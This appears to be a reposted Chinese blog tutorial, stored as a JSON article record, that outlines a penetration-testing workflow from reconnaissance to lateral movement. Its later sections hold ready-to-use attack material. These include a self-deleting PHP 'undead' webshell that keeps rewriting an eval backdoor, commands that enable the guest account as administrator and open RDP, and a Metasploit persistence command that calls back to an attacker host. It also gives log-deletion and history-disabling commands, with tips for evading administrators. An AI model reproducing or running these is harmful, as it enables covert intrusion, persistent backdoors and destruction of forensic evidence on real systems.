{"title":"(转)渗透测试-基本流程","uid":"8b9aeb65c936050fec0fc9c20edbf39b","slug":"转-渗透测试-基本流程","date":"2024-03-21T14:50:33.000Z","updated":"2024-03-21T14:51:34.220Z","comments":true,"path":"api/articles/转-渗透测试-基本流程.json","keywords":null,"cover":null,"content":"<p>一般来说，渗透测试的基本流程如下：</p>\n<ol>\n<li>确定目标</li>\n<li>信息收集</li>\n<li>漏洞探测</li>\n<li>漏洞利用getshell</li>\n<li>内网转发</li>\n<li>内网渗透</li>\n<li>痕迹清除</li>\n<li>撰写渗透测试报告</li>\n</ol>\n<h2 id=\"一-确定目标\"><a href=\"#一-确定目标\" class=\"headerlink\" title=\"一 确定目标\"></a><strong>一 确定目标</strong></h2><p>这个没什么好说的就是确定你的渗透目标是什么。</p>\n<h2 id=\"二-信息收集\"><a href=\"#二-信息收集\" class=\"headerlink\" title=\"二 信息收集\"></a><strong>二 信息收集</strong></h2><p><strong>信息收集是整个渗透测试中最重要的一步</strong>，你要把你要攻击的目标全部探测清楚，才能更好的攻击。<strong>信息收集的越丰富，内容或情报收集的越多，攻击的成功率就越高。</strong></p>\n<p>而信息收集到底要收集哪些信息呢？接下来，我就给大家整理了一下，渗透测试中常见的一些需要收集的信息。</p>\n<p><strong>1.主机扫描(Nessus)</strong></p>\n<p>对目标主机进行扫描，而不仅仅是对网站进行扫描，扫描目标主机开放了哪些端口，扫描端口运行的服务，目标主机上有哪些漏洞。</p>\n<p>主机扫描的工具也有很多，比如：Nessus</p>\n<p><strong>2.端口扫描(nmap)</strong></p>\n<p>需要知道目标服务器开放了哪些端口，常见的如 135 、137 、138 、139 、445，这几个端口经常爆发漏洞。以下是一些服务端口的漏洞：</p>\n<p>22——&gt;ssh弱口令</p>\n<p>873——&gt;rsync 未授权访问漏洞</p>\n<p>3306——&gt;mysql弱口令</p>\n<p>6379——&gt;redis未授权访问漏洞</p>\n<p>端口扫描工具有nmap和masscan。nmap扫描的准确性较高，但是扫描的比较慢。masscan扫描的比较快，但是准确性较低。</p>\n<p><strong>3.网站敏感目录和文件</strong></p>\n<p>扫描网站目录结构，看看是否可以遍历目录，或者敏感文件泄漏</p>\n<ul>\n<li>后台目录：弱口令，万能密码，爆破</li>\n<li>安装包：获取数据库信息，甚至是网站源码</li>\n<li>上传目录：截断、上传图片马等</li>\n<li>mysql管理接口：弱口令、爆破，万能密码，然后脱裤，甚至是拿到shell</li>\n<li>安装页面 ：可以二次安装进而绕过</li>\n<li>phpinfo：会把你配置的各种信息暴露出来</li>\n<li>编辑器：fck、ke、等</li>\n<li>iis短文件利用：条件比较苛刻 windows、apache等</li>\n</ul>\n<p>提到了网站敏感目录我们就不得不提 robots.txt 文件了</p>\n<p>robots.txt 文件是专门针对搜索引擎机器人robot 编写的一个纯文本文件。我们可以在这个文件中指定网站中不想被robot访问的目录。这样，我们网站的部分或全部内容就可以不被搜索引擎收录了，或者让搜索引擎只收录指定的内容。因此我们可</p>\n<p>以利用robots.txt让Google的机器人访问不了我们网站上的重要文件，GoogleHack的威胁也就不存在了。</p>\n<p>假如编写的robots.txt文件内容如下：</p>\n<div class=\"language-txt\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">txt</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #babed8\">User-agent: *</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">Disallow: /data/</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">Disallow: /db/</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">Disallow: /admin/</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">Disallow: /manager/</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">Allow:/images/</span></span></code></pre></div><p>其中“Disallow”参数后面的是禁止robot收录部分的路径，例如我们要让robot禁止收录网站目录下的“data”文件夹，只需要在Disallow参数后面加上 &#x2F;data&#x2F; 即可。如果想增加其他目录，只需按此格式继续添加。文件编写完成后将其上传到网站的根目录，就可以让网站远离Google Hack了。</p>\n<p>虽然robots文件目的是让搜索蜘蛛不爬取想要保护的页面，但是如果我们知道了robots文件的内容的话，我们就可以知道目标网站哪些文件夹不让访问，从侧面说明这些文件夹是很重要的了。</p>\n<p>探测目标网站后台目录的工具有：wwwscan 、御剑 、 dirbuster、cansina 等</p>\n<p><strong>4.旁站和C段扫描</strong></p>\n<p>旁站指的是同一服务器上的其他网站，很多时候，有些网站可能不是那么容易入侵。那么，可以查看该网站所在的服务器上是否还有其他网站。如果有其他网站的话，可以先拿下其他网站的webshell，然后再提权拿到服务器的权限，最后就自然可以拿下该网站了！</p>\n<p>对于红蓝对抗和护网，C段扫描比较有意义。对于单独网站的渗透测试，C段扫描意义不大。C段指的是同一内网段内的其他服务器，每个IP有ABCD四个段，举个例子，192.168.0.1，A段就是192，B段是168，C段是0，D段是1，而C段嗅探的意思就是拿下它同一C段中的其中一台服务器，也就是说是D段1-255中的一台服务器，然后利用工具嗅探拿下该服务器。</p>\n<p><strong>5.网站漏洞扫描</strong></p>\n<p>网站漏洞扫描就是直接对网站进行漏洞探测了。网站漏洞扫描也有很多工具。比如 AWVS、AppScan、OWASP-ZAP、nessuss等等。但是需要注意的是，使用漏扫工具直接对网站进行扫描，因为一下子流量过大，有些网站可能会崩溃。所以一般最好不要使用漏洞扫描工具对网站进行扫描。并且如果未经授权就用漏扫对网站进行扫描还是违法的！</p>\n<p><strong>6.网站指纹识别</strong></p>\n<p>在渗透测试中，对目标服务器进行指纹识别是相当有必要的，因为只有识别出相应的Web容器或者CMS，才能查找与其相关的漏洞，然后才能进行相应的渗透操作。CMS又称整站系统。常见的CMS有：WordPress、Dedecms、Discuz、PhpWeb、PhpWind、Dvbbs、PhpCMS、ECShop、、SiteWeaver、AspCMS、帝国、Z-Blog等。</p>\n<p>常见的网站指纹识别工具有：whatweb等。</p>\n<p><strong>7.公司敏感信息网上搜集</strong></p>\n<p>当确定了公司后，我们可以去互联网上查询与该公司有关的任何信息。比如，公司的邮箱格式，公司的员工姓名，以及与该公司有关的任何信息。并且，我们还可以去Github、码云等代码托管平台上查找与此有关的敏感信息，有些粗心的程序员在将代码上传至代码托管平台后，并没有对代码进行脱敏处理。导致上传的代码中有包含如数据库连接信息、邮箱密码、还有可能有泄露的源代码等。</p>\n<p><strong>8.域名信息的收集</strong></p>\n<p>当我们确定了要渗透的目标，也就是知道了其域名，接下来我们需要收集域名对应的 ip，域名的whois信息、子域名等等一系列与域名相关的信息。</p>\n<p>判断域名对应的IP：首先，我们要判断该域名是否存在CDN的情况，我们可以去在线CDN查询网站：多个地点Ping服务器,网站测速 - 站长工具 。如果查询出的ip数量大于一个的话，则说明该ip地址不是真实的服务器地址。以我的经验来看，如果是2个或者3个，并且这几个地址是同一地区的不同运营商的话，则很有可能这几个地址是服务器的出口地址，该服务器在内网中，通过不同运营商NAT映射供互联网访问，同时采用几个不同的运营商可以负载均衡和热备份。如果是多个ip地址，并且这些ip地址分布在不同地区的话，则基本上可以断定就是采用了CDN了。</p>\n<p>域名的whois信息：whois是用来查询域名注册所有者等信息的传输协议。简单说，whois就是一个用来查询域名是否已经被注册，以及注册域名的详细信息的数据库（如域名所有人、域名注册商）。通过whois来实现对域名信息的查询。早期的whois查询多以命令行接口存在，但是现在出现了一些网页接口简化的线上查询工具，可以一次向不同的数据库查询。网页接口的查询工具仍然依赖whois协议向服务器发送查询请求，命令行接口的工具仍然被系统管理员广泛使用。whois通常使用TCP协议43端口。每个域名&#x2F;IP的whois信息由对应的管理机构保存。</p>\n<h2 id=\"三-漏洞探测\"><a href=\"#三-漏洞探测\" class=\"headerlink\" title=\"三 漏洞探测\"></a>三 漏洞探测</h2><p>当我们收集到了足够多的信息之后，我们就要开始对网站进行漏洞探测了。探测网站是否存在一些常见的Web漏洞，比如：</p>\n<ul>\n<li>SQL注入</li>\n<li>XSS跨站脚本</li>\n<li>CSRF跨站请求伪造</li>\n<li>XXE漏洞</li>\n<li>SSRF服务端请求伪造漏洞</li>\n<li>文件包含漏洞</li>\n<li>文件上传漏洞</li>\n<li>文件解析漏洞</li>\n<li>远程代码执行漏洞</li>\n<li>CORS跨域资源共享漏洞</li>\n<li>越权访问漏洞</li>\n<li>目录浏览漏洞和任意文件读取&#x2F;下载漏洞</li>\n<li>struts2漏洞</li>\n<li>JAVA反序列化漏洞</li>\n</ul>\n<p>这些是网站经常发现的一些漏洞，还有一些网站漏洞，这里我就不一一列举出来了。</p>\n<p>网站漏洞扫描工具也有很多，比如：</p>\n<ul>\n<li>AWVS</li>\n<li>AppScan</li>\n<li>Owasp-Zap</li>\n<li>Nessus</li>\n</ul>\n<p>网站漏洞扫描工具我就列举这几种，还有很多，最常用的是这几个！</p>\n<h2 id=\"四-漏洞利用\"><a href=\"#四-漏洞利用\" class=\"headerlink\" title=\"四 漏洞利用\"></a>四 漏洞利用</h2><p>当我们探测到了该网站存在漏洞之后，我们就要对该漏洞进行利用了。不同的漏洞有不同的利用工具，很多时候，通过一个漏洞我们很难拿到网站的webshell，我们往往需要结合几个漏洞来拿webshell。常用的漏洞利用工具如下：</p>\n<p>SQL注入 ——&gt; Sqlmap</p>\n<p>XSS跨站脚本——&gt; Beef-XSS</p>\n<p>抓包改包工具——&gt; Burpsuite工具 、 Fidder抓包软件</p>\n<p>文件上传漏洞，上传漏洞的话，我们一般会上传一句话木马上去，进而再获得webshell，传送门——&gt; Webshell和一句话木马</p>\n<p>但是，获得了webshell后，一般权限很低，所以我们需要提权，可以选择反弹一个MSF类型的shell提权：Metasploit Framework(MSF)的使用 、 Msfvenonm生成一个后门木马，也可以反弹一个CobaltStrike类型的shell：渗透测试神器Cobalt Strike的使用， 也可以MSF和CobaltStrike联动：MSF和CobaltStrike联动 也可以使用其他提权：Windows提权 、 Linux提权</p>\n<h2 id=\"五-内网转发\"><a href=\"#五-内网转发\" class=\"headerlink\" title=\"五 内网转发\"></a>五 内网转发</h2><p>当我们获取到了网站的Webshell之后，如果我们想获取该主机的有关信息，我们可以将该主机的webshell换成MSF的shell。直接生成一个木马，然后在菜刀中执行该木马，我们就能接收到一个MSF类型的shell了。</p>\n<p>如果我们还想进一步的探测内网主机的信息的话，我们就需要进行内网转发了。我们是不能直接和内网的主机通信的，所以我们就需要借助获取到的webshell网站的服务器和内网主机进行通信。</p>\n<h2 id=\"六-内网横向渗透\"><a href=\"#六-内网横向渗透\" class=\"headerlink\" title=\"六 内网横向渗透\"></a>六 内网横向渗透</h2><p>当我们在获取了外网服务器的权限，进入该系统后，我们要想尽办法从该服务器上查找到我们想要的信息。</p>\n<p>对于windows主机，我们应该多去翻翻目录，或许能有很多意想不到的结果。很多人习惯把账号密码等容易忘的东西存放在备忘录中，或者是桌面上。我们还可以查找数据库的连接文件，查看数据库的连接账号密码等敏感信息。当我们获得了windows主机的账号密码，或者是自己创建了新用户后，我们为了不被网站管理员发现和不破坏服务器。我们尽量不要使用远程桌面。因为使用远程桌面动静比较大，如果此时服务器管理员也在登录，而你此时通过远程桌面登录的话，会将管理员挤掉，而你也将很快的被管理员踢掉。对于实在是要远程桌面登录的情况的话，我们尽量不要新建一个用户进行登录。我们可以激活 guest 用户，然后将其加入 administrators 组里面，用 guest 用户身份登录。在RDP远程登录后，我们可以查看其他用户桌面上和其他目录有哪些软件，我们要找的目标有以下。</p>\n<ul>\n<li>FTP相关的软件</li>\n<li>数据库相关的软件</li>\n<li>打开浏览器，查看历史记录，查看某些网站是否保存有用户密码。利用工具查看浏览器保存的密码</li>\n</ul>\n<p>从该主机上找到的账号密码，我们可以做一个字典，在对内网其他机器进行爆破的时候，很有可能是同密码。</p>\n<div class=\"language-txt\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">txt</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #babed8\">net user  guest  /active:yes                      #激活guest用户</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">net localgroup  administrators  guest  /add       #将guest用户添加到</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">net user guest    密码                            #更改guest用户密码</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">REG ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f                          #开启3389端口</span></span></code></pre></div><p>对于Linux主机，我们可以查看开放的端口号，开放的服务，与其建立连接的内网主机。查看目录，查找网站数据库连接密码。总之，就是尽可能的多查找一些账号密码，这对于内网的账号爆破非常有用。</p>\n<p>在搭建了隧道可以通内网后，我们首先就需要对内网进行资产发现了。但是对于内网存活网段的判断是一个大问题。内网很有可能同时存在 10.0.0.0&#x2F;8、172.16.0.0&#x2F;16、192.168.0.0&#x2F;24 网段。这就需要我们用扫描器对其进行探测了。通过代理进行内网扫描不建议使用nmap。如果是在本地主机通过代理扫描，可以图形化界面的话，可以使用 RouterScan 、御剑高速TCP全端口扫描器、IIS_Scanner。但是注意线程调低一点，不然代理很容易崩了。如果使用命令行扫描器的话，可以使用S扫描器。在扫描了内网资产和端口开放情况后，对于445端口，就可以打一波MS17_010。但是注意通过代理打445，和之前的是不一样的。传送门——&gt; 内网渗透之MS17-010 。对于3389端口，可以打一波CVE-2019-0708，传送门——&gt; CVE-2019-0708 远程桌面漏洞复现 。对于1433&#x2F;3306&#x2F;6379等端口，可以尝试爆破，利用之前收集到的账号密码成功率更高哦。</p>\n<p><strong>权限维持</strong></p>\n<p>在拿到目标主机的权限后，很有可能当时我们并不能获取到想要的东西，需要进行长期的潜伏，特别是在内网渗透中，需要进行长期的信息收集。这时，权限维持就很重要了。我们需要维持住获得的现有权限。</p>\n<p><strong>Web后门</strong></p>\n<p>1：隐藏后门文件(将文件设置为隐藏)</p>\n<p>2：不死马，该脚本每5秒向服务器创建test.php，并写入一句话免杀木马。结合attrib命令隐藏文件更好地建立后门。</p>\n<div class=\"language-txt\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">txt</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #babed8\">&lt;?php</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">    set_time_limit(0);//程序执行时间</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">    ignore_user_abort(1);//关掉终端后脚本仍然运行</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">    unlink(__FILE__);//文件完整名</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">    while(1)&#123;</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">        file_put_contents(&#39;test.php&#39;,&#39;&lt;?php $a=array($_REQUEST[&quot;x&quot;]=&gt;&quot;3&quot;);</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">        $b=array_keys($a)[0];</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">        eval($b);?&gt;&#39;);</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">        sleep(5);</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">    &#125;</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">?&gt;</span></span></code></pre></div><p>3：404页面隐藏后门，或者在其他自带文件中插入后门代码</p>\n<p>注：以上几种后门方法均能被D盾等工具检测到</p>\n<p><strong>Windows系统</strong></p>\n<p>1：建立隐藏用户，在用户名后加 $</p>\n<p>2：在开机启动目录下放置木马文件，只要目标机器重启，将回连我们的远控</p>\n<p>3：MSF里的 persistence 模块，执行命令可以使目标机器每隔一定时间自动回连远控。但是容易被发现</p>\n<div class=\"language-txt\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">txt</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #babed8\">#反弹时间间隔是5s 会自动连接192.168.27的4444端口，缺点是容易被杀毒软件查杀</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">run persistence -X -i 5 -p 8888 -r 192.168.10.27  </span></span>\n<span class=\"line\"><span style=\"color: #babed8\"> </span></span>\n<span class=\"line\"><span style=\"color: #babed8\">#然后它就在目标机新建了这个文件：C:\\Windows\\TEMP\\CJzhFlNOWa.vbs ，并把该服务加入了注册表中，只要开机就会启动</span></span></code></pre></div><p>4：在域环境下，想办法获得 krbtgt 用户的哈希，该用户的哈希可以进行票据传递攻击。而且一般该用户的密码不经常改变。</p>\n<p>5：shift后门</p>\n<p>6：远程桌面会话劫持</p>\n<p><strong>Linux系统</strong></p>\n<p>1：SSH后门</p>\n<p>2：crontab定时任务</p>\n<p>3：SSH公钥</p>\n<p>4：创建SUID&#x3D;0的用户</p>\n<h2 id=\"七-痕迹清除\"><a href=\"#七-痕迹清除\" class=\"headerlink\" title=\"七 痕迹清除\"></a>七 痕迹清除</h2><p>当我们达到了目的之后，有时候只是为了黑入网站挂黑页，炫耀一下；或者在网站留下一个后门，作为肉鸡，没事的时候上去溜达溜达；亦或者挂入挖矿木马；但是大家千万不要干这些事，这些都是违法的！</p>\n<p>我这里只是教大家在渗透进去之后如何清除我们留下的一部分痕迹，并不能完全清除，完全清除入侵痕迹是不可能的！主要是增加管理员发现入侵者的时间成本和人力成本。只要管理员想查，无论你怎么清除，还是能查到的。</p>\n<p>最主要还是要以隐藏自身身份为主，最好的手段是在渗透前挂上代理，然后在渗透后痕迹清除。</p>\n<p>Windows系统</p>\n<p>1：如果是windows系统，可用MSF中的 clearev 命令清除痕迹</p>\n<p>2：如果3389远程登录过，需要清除mstsc痕迹</p>\n<p>3：执行命令清除日志：</p>\n<div class=\"language-txt\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">txt</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #babed8\">del %WINDR%\\* .log /a/s/q/f</span></span></code></pre></div><p>4：如果是web应用，找到web日志文件，删除</p>\n<p>Linux系统</p>\n<p>1：如果是Linux系统，在获取权限后，执行以下命令，不会记录输入过的命令</p>\n<div class=\"language-txt\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">txt</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #babed8\">export HISTFILE=/dev/null export HISTSIZE=0</span></span></code></pre></div><p>2：删除 &#x2F;var&#x2F;log 目录下的日志文件</p>\n<p>3：如果是web应用，找到web日志文件，删除</p>\n<h3 id=\"八-撰写渗透测试保告\"><a href=\"#八-撰写渗透测试保告\" class=\"headerlink\" title=\"八 撰写渗透测试保告\"></a>八 撰写渗透测试保告</h3>","text":"一般来说，渗透测试的基本流程如下： 确定目标 信息收集 漏洞探测 漏洞利用getshell 内网转发 内网渗透 痕迹清除 撰写渗透测试报告 一 确定目标这个没什...","permalink":"/post/转-渗透测试-基本流程","photos":[],"count_time":{"symbolsCount":"6.9k","symbolsTime":"6 mins."},"categories":[],"tags":[],"toc":"<ol class=\"toc\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E4%B8%80-%E7%A1%AE%E5%AE%9A%E7%9B%AE%E6%A0%87\"><span class=\"toc-text\">一 确定目标</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E4%BA%8C-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86\"><span class=\"toc-text\">二 信息收集</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E4%B8%89-%E6%BC%8F%E6%B4%9E%E6%8E%A2%E6%B5%8B\"><span class=\"toc-text\">三 漏洞探测</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E5%9B%9B-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8\"><span class=\"toc-text\">四 漏洞利用</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E4%BA%94-%E5%86%85%E7%BD%91%E8%BD%AC%E5%8F%91\"><span class=\"toc-text\">五 内网转发</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E5%85%AD-%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F\"><span class=\"toc-text\">六 内网横向渗透</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E4%B8%83-%E7%97%95%E8%BF%B9%E6%B8%85%E9%99%A4\"><span class=\"toc-text\">七 痕迹清除</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E5%85%AB-%E6%92%B0%E5%86%99%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%BF%9D%E5%91%8A\"><span class=\"toc-text\">八 撰写渗透测试保告</span></a></li></ol></li></ol>","author":{"name":"Myprefer","slug":"blog-author","avatar":"https://gravatar.com/avatar/d195051819ce742212020a79d768fb6c?size=256&cache=1710768150791","link":"https://github.com/Myprefer","description":"web security learner, ML learner","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}},"mapped":true,"hidden":false,"prev_post":{"title":"未授权访问","uid":"9f7b33d2add141a55d4dd7ea060f1cd5","slug":"未授权访问","date":"2024-03-26T07:47:00.000Z","updated":"2024-03-26T15:09:50.816Z","comments":true,"path":"api/articles/未授权访问.json","keywords":null,"cover":null,"text":"漏洞简述描述 未授权访问漏洞，是在攻击者没有获取到登录权限或未授权的情况下，或者不需要输入密码，即可通过直接输入网站控制台主页面地址，或者不允许查看的链接便可进...","permalink":"/post/未授权访问","photos":[],"count_time":{"symbolsCount":"2.6k","symbolsTime":"2 mins."},"categories":[],"tags":[{"name":"网络安全","slug":"网络安全","count":21,"path":"api/tags/网络安全.json"},{"name":"学习日志","slug":"学习日志","count":21,"path":"api/tags/学习日志.json"}],"author":{"name":"Myprefer","slug":"blog-author","avatar":"https://gravatar.com/avatar/d195051819ce742212020a79d768fb6c?size=256&cache=1710768150791","link":"https://github.com/Myprefer","description":"web security learner, ML learner","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}}},"next_post":{"title":"WEB攻防-反序列化","uid":"ac4ec20c26cff8515ee8496cfa9ab5e9","slug":"WEB攻防-反序列化","date":"2024-03-18T13:45:44.000Z","updated":"2024-04-21T10:30:45.807Z","comments":true,"path":"api/articles/WEB攻防-反序列化.json","keywords":null,"cover":[],"text":"反序列化什么是反序列化格式转换 序列化: 对象转换为数组或字符串等格式 反序列化: 将数组或字符串等格式转换成对象 PHP反序列化漏洞产生原因魔法方法 触发：u...","permalink":"/post/WEB攻防-反序列化","photos":[],"count_time":{"symbolsCount":"2k","symbolsTime":"2 mins."},"categories":[],"tags":[],"author":{"name":"Myprefer","slug":"blog-author","avatar":"https://gravatar.com/avatar/d195051819ce742212020a79d768fb6c?size=256&cache=1710768150791","link":"https://github.com/Myprefer","description":"web security learner, ML learner","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}}}}